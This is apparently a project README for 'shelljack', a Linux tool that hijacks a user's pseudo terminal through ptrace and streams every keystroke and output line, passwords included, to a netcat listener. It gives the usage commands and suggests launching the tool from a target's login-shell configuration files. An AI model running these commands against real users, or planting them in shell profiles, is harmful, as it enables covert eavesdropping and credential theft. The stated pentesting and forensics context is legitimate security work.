# shelljack #

_shelljack_ is a [terminal](http://en.wikipedia.org/wiki/Computer_terminal) [sniffer](http://en.wikipedia.org/wiki/Packet_analyzer) for [Linux](http://en.wikipedia.org/wiki/Linux) [x86_64](http://en.wikipedia.org/wiki/X86_64) machines. 

**What is a "terminal sniffer"?**

A terminal sniffer is a piece of software that inspects user [I/O](http://en.wikipedia.org/wiki/I/o) as it crosses the terminal. The most common usage of this term would be a [keystroke logger](http://en.wikipedia.org/wiki/Keystroke_logging). However, _shelljack_ would need to be made much more complex to become a simple keystroke logger. In addition to reporting back all keystrokes put into the terminal, _shelljack_ also reports back all of the data returned back out through the terminal.

**So it's a kernel module then?**

No. _shelljack_ works entirely in [user space](http://en.wikipedia.org/wiki/User_space) to perform the [shelljacking](https://github.com/emptymonkey/shelljack).

**What is shelljacking?**

It's a term I use to describe a very specific type of terminal sniffing attack. _shelljack_ performs a [pseudo terminal](http://en.wikipedia.org/wiki/Pseudo_terminal) [mitm attack](http://en.wikipedia.org/wiki/Man-in-the-middle_attack).

**So, I can use this to see what someone is doing in their shell?**

Yes, and more. This tool will happily target any process, but is designed to be used against a [session leader](https://github.com/emptymonkey/ctty), which usually means a users [shell](http://en.wikipedia.org/wiki/Unix_shell). Also, it is important to note that a successful shelljacking means you are embedded in the traffic flow between user and the program. *You will be sniffing all traffic down the line, including child processes and ssh sessions to other hosts!*

**That's awesome! [1337 h4X0rZ rUL3!!](http://hackertyper.com/)**

While I do think it's pretty neat, it really isn't "[hacking](http://en.wikipedia.org/wiki/Hacker_%28computer_security%29)". There are no exploits here. _shelljack_ takes advantage of [deep magic](http://en.wikipedia.org/wiki/Deep_magic) in Linux that, while often not well understood, is completely legitimate. In order to shelljack a target, you will need the appropriate permissions to do so. 

While this may not be a "[sploit](http://en.wikipedia.org/wiki/Sploit)", it is a very handy tool designed to empower [pentesters](http://en.wikipedia.org/wiki/Pentester), [forensic analysts](http://en.wikipedia.org/wiki/Computer_forensics), and educators.

**Do I need to be root already to use it?**

No. You need "appropriate permissions" in order for it to work. That means you will either need to be root, or the uid of the target process. 

**Why would I use this?**

* As a pentester who has gained execution as a user, you can now shelljack that user for further reconnaissance and credential harvesting.
* As a forensic analyist, you can eavesdrop on the user who is the target of your investigation (after you've recieved the appropriate authority to do so from the heads of Security, Legal, and HR, of course.)
* As a sysadmin, or other educator, to publicly demonstrate why sane file permissions are important. 

**How does it work?**

[ptrace](http://en.wikipedia.org/wiki/Ptrace): If you want to *really* understand the inner workings of a Linux process and other deep magic, learn ptrace. The best intro I've seen comes in the form of two articles by Pradeep Padala dating back to 2002: [Playing with ptrace, Part I](http://www.linuxjournal.com/article/6100) and [Playing with ptrace, Part II](http://www.linuxjournal.com/article/6210)

[tty](http://en.wikipedia.org/wiki/Tty_%28Unix%29): If you want to understand shelljacking, then you will need to understand the underlying tty semantics. The best tutorial on the topic is [The TTY demystified](www.linusakesson.net/programming/tty/) by [Linus Åkesson](http://www.linusakesson.net/pages/me.php). 

**Is this portable to other OSs/Architectures?**

We are using a Linux semantic (ptrace) to inject syscalls using their assembly form. Nothing here is portable. That said, check out my other project, [_ptrace_do_](https://github.com/emptymonkey/ptrace_do). If I get around to supporting _ptrace_do_ for other architectures, then porting _shelljack_ shouldn't be too hard.

# Usage # 

In order to properly mitm the [signals](http://en.wikipedia.org/wiki/Unix_signal) as well as the I/O, _shelljack_ must detach from the launching terminal. As such, you'll need a listener to catch its eavesdropped output. [Netcat](http://en.wikipedia.org/wiki/Netcat) works nicely for this. (We've chosen localhost and port 9999 here. Anything that the machine can route, however, _shelljack_ will happily use.)

Let's setup the listener:

	empty@monkey:~$ tty
	/dev/pts/0
	empty@monkey:~$ while [ 1 ]; do ncat -l localhost 9999; done

Since this is a demo, let's also look at the shell we want to target:

	empty@monkey:~$ tty
	/dev/pts/3
	empty@monkey:~$ echo $$
	19716
	empty@monkey:~$ ls -apl /proc/$$/fd
	total 0
	dr-x------ 2 empty empty  0 Jun 16 16:17 ./
	dr-xr-xr-x 8 empty empty  0 Jun 16 16:17 ../
	lrwx------ 1 empty empty 64 Jun 16 16:17 0 -> /dev/pts/3
	lrwx------ 1 empty empty 64 Jun 16 16:18 1 -> /dev/pts/3
	lrwx------ 1 empty empty 64 Jun 16 16:18 2 -> /dev/pts/3
	lrwx------ 1 empty empty 64 Jun 16 16:18 255 -> /dev/pts/3

Now, launch shelljack against the target pid:

	empty@monkey:~/code/shelljack$ tty
	/dev/pts/2
	empty@monkey:~$ shelljack localhost:9999 19716

Back at the listener, you will now see all the I/O in real time as the user interacts with the shelljacked shell. For further evidence of this, lets go examine the target shell again:

	empty@monkey:~$ ls -apl /proc/$$/fd
	total 0
	dr-x------ 2 empty empty  0 Jun 16 16:17 ./
	dr-xr-xr-x 8 empty empty  0 Jun 16 16:17 ../
	lrwx------ 1 empty empty 64 Jun 16 16:17 0 -> /dev/pts/4
	lrwx------ 1 empty empty 64 Jun 16 16:18 1 -> /dev/pts/4
	lrwx------ 1 empty empty 64 Jun 16 16:18 2 -> /dev/pts/4
	lrwx------ 1 empty empty 64 Jun 16 16:18 255 -> /dev/pts/4
	empty@monkey:~$ ps j -u empty | grep $$
	19714 19716 19716 19716 pts/4    19867 Ss    1000   0:00 -bash
	    1 19782 19782 19782 pts/3    19782 Ss+   1000   0:00 ./shelljack localhost 9999 19716

Finally, we can see that _shelljack_ has successfully taken over /dev/pts/3, and is now serving up /dev/pts/4 for the target shell to consume. It sits as the quintessential mitm, and will happily forward you a copy of everything it sees. (Yes, even with "[echo off](http://linux.die.net/man/1/stty)".)

Also note, _shelljack_ was designed with the ability to attack the shell that is calling it. This makes it ideal for launching out of the targets login shell through its [configuration files](http://en.wikipedia.org/wiki/.profile#Configuration_files_for_shells).

	empty@monkey:~$ ls -l /proc/$$/fd
	total 0
	lrwx------ 1 empty empty 64 Jun 16 16:33 0 -> /dev/pts/3
	lrwx------ 1 empty empty 64 Jun 16 16:33 1 -> /dev/pts/3
	lrwx------ 1 empty empty 64 Jun 16 16:33 2 -> /dev/pts/3
	lrwx------ 1 empty empty 64 Jun 16 16:33 255 -> /dev/pts/3
	empty@monkey:~$ shelljack localhost:9999 $$
	empty@monkey:~$ ls -l /proc/$$/fd
	total 0
	lrwx------ 1 empty empty 64 Jun 16 16:33 0 -> /dev/pts/4
	lrwx------ 1 empty empty 64 Jun 16 16:33 1 -> /dev/pts/4
	lrwx------ 1 empty empty 64 Jun 16 16:33 2 -> /dev/pts/4
	lrwx------ 1 empty empty 64 Jun 16 16:33 255 -> /dev/pts/4

